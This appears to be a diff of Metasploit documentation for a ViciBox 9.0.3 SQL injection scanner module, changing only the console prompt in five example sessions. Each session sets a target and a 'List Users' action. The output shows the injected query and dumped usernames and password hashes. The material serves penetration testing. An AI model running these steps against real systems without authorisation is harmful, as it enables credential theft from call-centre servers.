@@ -64,16 +64,16 @@ Username for the user to login with. Defaults to admin username of `6666`.
 ### ViciBox 9.0.3 - List Users - modify_email_accounts method
 
 ```
-msf6 use auxiliary/scanner/http/vicidial_multiple_sqli
-msf6 auxiliary(scanner/http/vicidial_multiple_sqli) > set rhosts 1.1.1.1
+msf use auxiliary/scanner/http/vicidial_multiple_sqli
+msf auxiliary(scanner/http/vicidial_multiple_sqli) > set rhosts 1.1.1.1
 rhosts => 1.1.1.1
-msf6 auxiliary(scanner/http/vicidial_multiple_sqli) > set verbose true
+msf auxiliary(scanner/http/vicidial_multiple_sqli) > set verbose true
 verbose => true
-msf6 auxiliary(scanner/http/vicidial_multiple_sqli) > set password notpassword
+msf auxiliary(scanner/http/vicidial_multiple_sqli) > set password notpassword
 password => notpassword
-msf6 auxiliary(scanner/http/vicidial_multiple_sqli) > set action List Users - modify_email_accounts method
+msf auxiliary(scanner/http/vicidial_multiple_sqli) > set action List Users - modify_email_accounts method
 action => List Users - modify_email_accounts method
-msf6 auxiliary(scanner/http/vicidial_multiple_sqli) > run
+msf auxiliary(scanner/http/vicidial_multiple_sqli) > run
 
 [*] Enumerating Usernames and Password Hashes
 [*] {SQLi} Executing (select group_concat(TXMlUAF) from (select cast(concat_ws(';',ifnull(user,''),ifnull(pass,'')) as binary) TXMlUAF from vicidial_users limit 3) jUFFwQn)
@@ -97,16 +97,16 @@ vicidial_users
 ### ViciBox 9.0.3 - List Users - access_recordings method
 
 ```
-msf6 use auxiliary/scanner/http/vicidial_multiple_sqli
-msf6 auxiliary(scanner/http/vicidial_multiple_sqli) > set rhosts 1.1.1.1
+msf use auxiliary/scanner/http/vicidial_multiple_sqli
+msf auxiliary(scanner/http/vicidial_multiple_sqli) > set rhosts 1.1.1.1
 rhosts => 1.1.1.1
-msf6 auxiliary(scanner/http/vicidial_multiple_sqli) > set verbose true
+msf auxiliary(scanner/http/vicidial_multiple_sqli) > set verbose true
 verbose => true
-msf6 auxiliary(scanner/http/vicidial_multiple_sqli) > set password notpassword
+msf auxiliary(scanner/http/vicidial_multiple_sqli) > set password notpassword
 password => notpassword
-msf6 auxiliary(scanner/http/vicidial_multiple_sqli) > set action List Users - access_recordings method
+msf auxiliary(scanner/http/vicidial_multiple_sqli) > set action List Users - access_recordings method
 action => List Users - access_recordings method
-msf6 auxiliary(scanner/http/vicidial_multiple_sqli) > run
+msf auxiliary(scanner/http/vicidial_multiple_sqli) > run
 
 [*] Enumerating Usernames and Password Hashes
 [+] Dumped table contents:
@@ -126,16 +126,16 @@ vicidial_users
 ### ViciBox 9.0.3 - List Users - agent_time_sheet method
 
 ```
-msf6 use auxiliary/scanner/http/vicidial_multiple_sqli
-msf6 auxiliary(scanner/http/vicidial_multiple_sqli) > set rhosts 1.1.1.1
+msf use auxiliary/scanner/http/vicidial_multiple_sqli
+msf auxiliary(scanner/http/vicidial_multiple_sqli) > set rhosts 1.1.1.1
 rhosts => 1.1.1.1
-msf6 auxiliary(scanner/http/vicidial_multiple_sqli) > set verbose true
+msf auxiliary(scanner/http/vicidial_multiple_sqli) > set verbose true
 verbose => true
-msf6 auxiliary(scanner/http/vicidial_multiple_sqli) > set password notpassword
+msf auxiliary(scanner/http/vicidial_multiple_sqli) > set password notpassword
 password => notpassword
-msf6 auxiliary(scanner/http/vicidial_multiple_sqli) > set action List Users - agent_time_sheet method
+msf auxiliary(scanner/http/vicidial_multiple_sqli) > set action List Users - agent_time_sheet method
 action => List Users - agent_time_sheet method
-msf6 auxiliary(scanner/http/vicidial_multiple_sqli) > run
+msf auxiliary(scanner/http/vicidial_multiple_sqli) > run
 
 [*] Enumerating Usernames and Password Hashes
 [+] Dumped table contents:
@@ -155,16 +155,16 @@ vicidial_users
 ### ViciBox 9.0.3 - List Users - agentcall_email method
 
 ```
-msf6 use auxiliary/scanner/http/vicidial_multiple_sqli
-msf6 auxiliary(scanner/http/vicidial_multiple_sqli) > set rhosts 1.1.1.1
+msf use auxiliary/scanner/http/vicidial_multiple_sqli
+msf auxiliary(scanner/http/vicidial_multiple_sqli) > set rhosts 1.1.1.1
 rhosts => 1.1.1.1
-msf6 auxiliary(scanner/http/vicidial_multiple_sqli) > set verbose true
+msf auxiliary(scanner/http/vicidial_multiple_sqli) > set verbose true
 verbose => true
-msf6 auxiliary(scanner/http/vicidial_multiple_sqli) > set password notpassword
+msf auxiliary(scanner/http/vicidial_multiple_sqli) > set password notpassword
 password => notpassword
-msf6 auxiliary(scanner/http/vicidial_multiple_sqli) > set action List Users - agentcall_email method
+msf auxiliary(scanner/http/vicidial_multiple_sqli) > set action List Users - agentcall_email method
 action => List Users - agentcall_email method
-msf6 auxiliary(scanner/http/vicidial_multiple_sqli) > run
+msf auxiliary(scanner/http/vicidial_multiple_sqli) > run
 
 [*] Enumerating Usernames and Password Hashes
 [+] Dumped table contents:
@@ -185,16 +185,16 @@ vicidial_users
 ### ViciBox 9.0.3 - List Users - user_stats method
 
 ```
-msf6 use auxiliary/scanner/http/vicidial_multiple_sqli
-msf6 auxiliary(scanner/http/vicidial_multiple_sqli) > set rhosts 1.1.1.1
+msf use auxiliary/scanner/http/vicidial_multiple_sqli
+msf auxiliary(scanner/http/vicidial_multiple_sqli) > set rhosts 1.1.1.1
 rhosts => 1.1.1.1
-msf6 auxiliary(scanner/http/vicidial_multiple_sqli) > set verbose true
+msf auxiliary(scanner/http/vicidial_multiple_sqli) > set verbose true
 verbose => true
-msf6 auxiliary(scanner/http/vicidial_multiple_sqli) > set password notpassword
+msf auxiliary(scanner/http/vicidial_multiple_sqli) > set password notpassword
 password => notpassword
-msf6 auxiliary(scanner/http/vicidial_multiple_sqli) > set action List Users - user_stats method
+msf auxiliary(scanner/http/vicidial_multiple_sqli) > set action List Users - user_stats method
 action => List Users - user_stats method
-msf6 auxiliary(scanner/http/vicidial_multiple_sqli) > run
+msf auxiliary(scanner/http/vicidial_multiple_sqli) > run
 
 [*] Enumerating Usernames and Password Hashes
 [+] Dumped table contents:
